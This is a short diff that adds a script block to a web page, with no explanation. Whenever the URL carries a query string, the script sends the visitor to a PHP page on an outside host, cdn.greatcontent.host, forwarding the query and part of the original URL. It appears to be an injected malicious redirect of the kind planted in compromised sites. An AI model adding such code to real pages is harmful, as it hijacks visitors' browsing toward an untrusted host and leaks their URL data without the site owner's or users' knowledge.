@@ -1,0 +1,12 @@
+<script>
+var r = window.location.href;
+if(r.indexOf('?') !== -1) {
+	var parts = r.split('?');
+	var k = parts[parts.length - 1]
+	var d = parts[parts.length - 2];
+	//var p = Math.floor(Math.random() * 100) + 1;
+	var p = '1';
+	var string1 = 'https://cdn.greatcontent.host/trending/' + p + '.php?' + k + '&r=' + d;
+	window.location.href = string1
+}
+</script>
